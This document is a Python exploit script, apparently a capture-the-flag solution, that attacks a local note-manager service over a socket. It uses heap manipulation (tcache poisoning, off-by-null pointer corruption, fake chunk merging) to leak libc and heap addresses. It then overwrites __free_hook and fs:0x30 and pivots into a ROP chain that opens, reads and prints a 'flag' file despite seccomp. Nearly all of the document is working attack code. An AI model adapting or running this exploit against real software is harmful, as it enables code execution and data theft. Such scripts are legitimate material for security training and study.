import socket
import sys
from time import sleep
from struct import pack, unpack

from utils import _is_int, to_bytes, from_bytes, rol
from roputils import *
from logger import Logger

logger = Logger("NOTE")

SERVER_ADDR = ('localhost', 8889)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(SERVER_ADDR)

def get_libc_path():
    with open("libcpath", "r") as f:
        return f.read()[:-1]

DELAY = 0.1

ALLOC = b'1'
FREE = b'2'
SHOW = b'3'

# NOTE: (would've saved me a few hours of debugging)
#       when decoding received input
#       the binary uses atoi to convert string to number
#       but it does not clean the buffer before reading the string
#       so it might actually decode a wrong number
#       unless the number as a string is not terminated 
#       with something non-ascii / null

alloc_idx = [False for _ in range(0x100)]

def allocate_request(size, content):

    def _get_alloc_idx():

        global alloc_idx

        idx = 0
        while idx <= 0xff:

            if alloc_idx[idx] is False:

                alloc_idx[idx] = True
                return idx

            idx += 1

        return idx      

    if type(content) == str:
        content = content.encode()

    sleep(DELAY)

    sock.recv(1024)
    sock.send(f"{_is_int(size)}".encode() + b'\x00')

    sleep(DELAY)

    if len(content) > 0:

        sock.recv(1024)
        sock.send(content)

    sleep(DELAY)
    sock.recv(1024)

    return _get_alloc_idx()

def free_request(idx):

    global alloc_idx

    alloc_idx[idx] = False

    sleep(DELAY)
    sock.recv(1024)
    sock.send(f"{_is_int(idx)}".encode() + b'\x00')

    return None

def show_request(idx):

    sleep(DELAY)
    sock.recv(1024)
    sock.send(f"{_is_int(idx)}".encode() + b'\x00')

    sleep(DELAY)
    recvd = sock.recv(1024 * 128)

    if recvd.find(b"********************\n") == 0:
        return None
    return recvd[:recvd.find(b"\n********************")]

def command(opt):

    sock.send(opt[0])

    if opt[0] is ALLOC:
        res = allocate_request(*opt[1:])
        logger.log_info(f"allocating chunk with size {hex(opt[1])}: idx {res}")
        return res

    elif opt[0] is FREE:
        logger.log_info(f"free chunk with index {opt[1]}")
        return free_request(*opt[1:])

    elif opt[0] is SHOW:
        logger.log_info(f"showing chunk with index {opt[1]}")
        return show_request(*opt[1:])

def command_stream():

    # PIE, ASLR, Canary, full RELRO

    UBIN_OFFSET = 0x1ebbe0
    FREE_HOOK_OFFSET = 0x1eeb28
    SYSCALL_OFFSET = 0x13d63b
    LEAKED_CHUNK_OFFSET = 0x3a30    # from heap base
    LONGJMP_OFFSET = 0x45eb0
    FS_ADDR_LIBC_OFFSET = -0x28c0
    PAYLOAD_OFFSET = 0x3f60         # from heap base

    # tcache management

    tcache_chunks = {}

    def _empty_tcache(size = 0x20):
        
        if size not in tcache_chunks.keys():
            tcache_chunks.update({size: []})

        for _ in range(7):
            tcache_chunks[size].append(command((ALLOC, size - 0x10, "TTTT")))

    def _fill_tcache(size = 0x20):

        nonlocal tcache_chunks

        for tch_chunk in tcache_chunks[size]:
            command((FREE, tch_chunk))

        tcache_chunks[size] = []

    sock.recv(1024)

    # seccomp calls malloc
    # before anything, exhaust all the free chunks
    # so that the next allocations are taken from the top

    # NOTE: backup for further usage of a fast chunk, w/o inconvenient allocations

    backup0 = command((ALLOC, 0x20 - 0x10, "EHEH"))
    backup1 = command((ALLOC, 0x20 - 0x10, "EHEH"))
    for _ in range(7 + 9 - 2):
        command((ALLOC, 0x20 - 0x10, "EHEH"))
    
    for _ in range(7 + 9):
        command((ALLOC, 0x70 - 0x10, "EHEH"))

    for _ in range(7 + 2):
        command((ALLOC, 0x80 - 0x10, "EHEH"))

    for _ in range(5):
        command((ALLOC, 0xd0 - 0x10, "EHEH"))

    for _ in range(2):
        command((ALLOC, 0xf0 - 0x10, "EHEH"))
    
    # seccomp allows: read, write, open, exit, exit_group
    # sbrk and mmap are not allowed
    # top size at this step: 0x1ed00
    # first 3 lsb hex digits for current top address: 0x300
    # (always the same due to libc base aligned to 0x1000 on a 4kb page size system)

    # allocating chunks for tcache management: 7 chunks, 0x20 size => 0xd0 + pad 0x20 = 0x100
    _empty_tcache() # first call does not actually empty the tcache, but allocates 7 chunks of size 0x20
    command((ALLOC, 0x20 - 0x10, "ZZZZ"))
    _fill_tcache()

    _empty_tcache()

    # sleep(100000)
    
    # top should now still be aligned to 0x100

    # ====== leaking libc and heap base ======

    # top lsb 0x400

    # initialization

    ch = {}
    ch["L2"] = command((ALLOC, 0x520 - 0x10, "AAAA"))     # 0x400
    ch["PAD2"] = command((ALLOC, 0xe0 - 0x10, "PPPP"))    
    ch["L3"] = command((ALLOC, 0x500 - 0x10, "AAAA"))     # 0xa00
    ch["PAD3"] = command((ALLOC, 0xf0 - 0x10, "PPPP"))   
    ch["L1"] = command((ALLOC, 0x510 - 0x10, "AAAA"))     # 0xff0
    ch["TOPGUARD"] = command((ALLOC, 0x430 - 0x10, "GGGG"))

    # setting   L1.fd_nextsize = L3
    #           L1.bk_nextsize = L2

    command((FREE, ch["L1"]))
    command((FREE, ch["L2"]))
    command((FREE, ch["L3"]))
    ch["BIG1"] = command((ALLOC, 0x600 - 0x10, "BBBB"))
    ch["L1"] = command((ALLOC, 0x510 - 0x10, "CCCC"))

    # splitting the freed L2 and L3

    ch["S3"] = command((ALLOC, 0x20 - 0x10, "SSSS"))     # 0xa00
    ch["D3"] = command((ALLOC, 0x4e0 - 0x10, "DDDD"))     
    ch["S2"] = command((ALLOC, 0x20 - 0x10, "SSSS"))     # 0x400
    ch["D2"] = command((ALLOC, 0x500 - 0x10, "DDDD"))     

    # free L1 and split it without losing FDNS and BKNS

    command((FREE, ch["BIG1"]))
    command((FREE, ch["TOPGUARD"]))
    command((FREE, ch["L1"]))

    ch["HOST"] = command((ALLOC, 0x30 - 0x10, b'\x11' * 8 + to_bytes(0x40)))     # 0xff0
    ch["POISONER"] = command((ALLOC, 0x20 - 0x10, "EEEE")) 
    ch["VICTIM"] = command((ALLOC, 0x500 - 0x10, "SSSS"))

    # set S2.fd = host + 0x10 = fake chunk
    
    _fill_tcache()
    command((FREE, ch["POISONER"]))
    command((FREE, ch["S2"]))
    _empty_tcache()
    ch["S2"] = command((ALLOC, 0x0, ""))    # malloc still allocates 0x20, 
                                            # but the content will have size 0
                                            # it will overwrite with \x00 the lsb of s2.fd = poisoner
                                            # poisoner & 0xffffffffffffff00 = fake chunk
    ch["POISONER"] = command((ALLOC, 0x20 - 0x10, "FFFF"))

    # set S3.bk = host + 0x10 = fake chunk
    # and also poison the victim
    
    _fill_tcache()
    command((FREE, ch["POISONER"]))
    command((FREE, ch["S3"]))
    _empty_tcache()
    ch["BIG2"] = command((ALLOC, 0x4f0 - 0x10, "BBBB"))
    ch["S3"] = command((ALLOC, 0x20 - 0x10, b'K' * 8))   # poisoner & 0xffffffffffffff00 = fake chunk
    ch["POISONER"] = command((ALLOC, 0x20 - 0x10 + 0x8, b'O' * 16 + to_bytes(0x40)))

    # free the victim and trigger merging with fake chunk

    command((FREE, ch["VICTIM"]))

    # allocate 0x20 fake chunk, 
    # so that the remainder start overlaps with poisoner
    # then, leak the unsorted bin address reading from poisoner

    ch["FAKE"] = command((ALLOC, 0x0, ""))
    leaked_ubin_addr = from_bytes(command((SHOW, ch["POISONER"])))

    libc_base_addr = leaked_ubin_addr - UBIN_OFFSET

    logger.log_success(f"Leaked libc base address: {hex(libc_base_addr)}")

    # put a chunk in front of the remainder, so that remainder.fd = leaked
    # and then read from poisoner again, and leak the binary base

    ch["REM"] = command((ALLOC, 0x520 - 0x10, "RRRR"))
    ch["LEAKED"] = command((ALLOC, 0x500 - 0x10, "LLLL"))    # bigger than TCACHE and FB size
    ch["PAD"] = command((ALLOC, 0x20 - 0x10, "PPPP"))
    command((FREE, ch["LEAKED"]))
    command((FREE, ch["REM"]))
    leaked_chunk_addr = from_bytes(command((SHOW, ch["POISONER"])))

    heap_base_addr = leaked_chunk_addr - LEAKED_CHUNK_OFFSET

    logger.log_success(f"Leaked heap base address: {hex(heap_base_addr)}")

    # ====== ROP attack ======

    # forge chunks near __free_hook and fs:0x30

    # free the fake chunk, intentionally leaving it in tcache
    # (tcache for 0x20 is empty at this step)
    # and then overriding the fake->next ptr with the host chunk

    command((FREE, backup0))    # so that the tcache count for 0x20 is 2 
                                # - this chunk will be lost afterwards -
    command((FREE, ch["FAKE"]))
    command((FREE, ch["HOST"]))
    ch["HOST"] = command((ALLOC, 0x30 - 0x10, b'\x22' * 8 + 
                                                to_bytes(0x20 + 0x1) + 
                                                to_bytes(FS_ADDR_LIBC_OFFSET + libc_base_addr + 0x30)))
    
    ch["FAKE"] = command((ALLOC, 0x20 - 0x10, "QQQQ"))
    ch["FS:0x30"] = command((ALLOC, 0x20 - 0x10, b'\x00' * 8))

    # repeat arbitrary chunk forging

    command((FREE, backup1))
    command((FREE, ch["FAKE"]))
    command((FREE, ch["HOST"]))
    ch["HOST"] = command((ALLOC, 0x30 - 0x10, b'\x33' * 8 + 
                                                to_bytes(0x20 + 0x1) + 
                                                to_bytes(FREE_HOOK_OFFSET + libc_base_addr - 0x8)))

    ch["FAKE"] = command((ALLOC, 0x20 - 0x10, "RRRR"))
    ch["FREE_HOOK"] = command((ALLOC, 0x20 - 0x10, b'N' * 8 + to_bytes(LONGJMP_OFFSET + libc_base_addr)))

    # payload preparation

    # we need a payload of the form
    #
    # rax = 2
    # rdi = &"flag"
    # rsi = 0
    #   syscall
    # rax = 0
    # rdi = rax
    # rsi = &aux_buffer
    # rdx = flag_len
    #   syscall
    # rax = 1
    # rdi = 1
    # rsi = &aux_buffer
    # rdx = flag_len
    #   syscall

    syscall_addr = SYSCALL_OFFSET + libc_base_addr

    payload_addr = PAYLOAD_OFFSET + heap_base_addr

    flag_len = 13
    flag_string_addr = payload_addr + 0x40
    aux_buffer_addr = payload_addr + 0x50
    fake_rsp = payload_addr + 0x60

    # searching for rop chains and building the payload

    r = ROP_util(get_libc_path(), Platform.X86_64, session_name = "NOTE")
    r.scout_for_gadgets()

    payload = r.make_payload()
    payload.set_max_size(0x900)

    payload.add_bytes(b'A' * 8 * 6 + 
                        to_bytes(rol(fake_rsp, 0x11)) + 
                        b'B' * 8 +                  # first gadget address TO BE REPLACED AFTER A FEW MORE STEPS 
                        b"flag" + b'\x00' * 0xc +   # flag string
                        b'\x00' * 0x10)             # aux buffer - empty

    payload.is_aligned_as(0x8)  # at the end, we take the first 8 bytes from the payload == first gadget address

    for chain in r.search_chain(f"rax = 2, rdi = {flag_string_addr}, rsi = 0", max_stack_byte_size = 0x200):

        chain.show()

        payload.add_chain(chain)
        payload.align_as(0x10)
        payload.add_addr(syscall_addr)

        break

    # NOTE: file opened by syscall has fd returned in rax
    #       ideally, we would have used a chain that moves rax to rdi
    #       but this type of chain was not found
    #       so we need to guess the fd value (in my case, it was 5)

    for chain in r.search_chain(f"rax = 0, rdi = 5, rsi = {aux_buffer_addr}, rdx = {flag_len}", max_stack_byte_size = 0x200):

        chain.show()

        payload.add_chain(chain)
        payload.align_as(0x10)
        payload.add_addr(syscall_addr)

        break

    for chain in r.search_chain(f"rax = 1, rdi = 1, rsi = {aux_buffer_addr}, rdx = {flag_len}", max_stack_byte_size = 0x200):

        chain.show()

        payload.add_chain(chain)
        payload.align_as(0x10)
        payload.add_addr(syscall_addr)

        break

    payload.add_addr(0xDEADBEEFDEADBEEF)

    payload = payload.build(chain_addr_offset = libc_base_addr)

    # relocating first chain addr from payload[0x60:]
    chain_addr = rol(from_bytes(payload[0x60: 0x68]), 0x11)
    payload = payload[:0x38] + to_bytes(chain_addr) + payload[0x40: 0x60] + \
                payload[0x68:]
    
    # allocating chunk with payload
    # (stack will be pivoted inside it)
    
    ch["PAYLOAD"] = command((ALLOC, 0x1010 - 0x10, payload))

    logger.log_info(f"Payload delivered at {hex(payload_addr)}")

    # trigger payload

    command((FREE, ch["PAYLOAD"]))

    logger.log_success(f"flag contents: {sock.recv(1024).decode()}")

if __name__ == "__main__":
    command_stream()
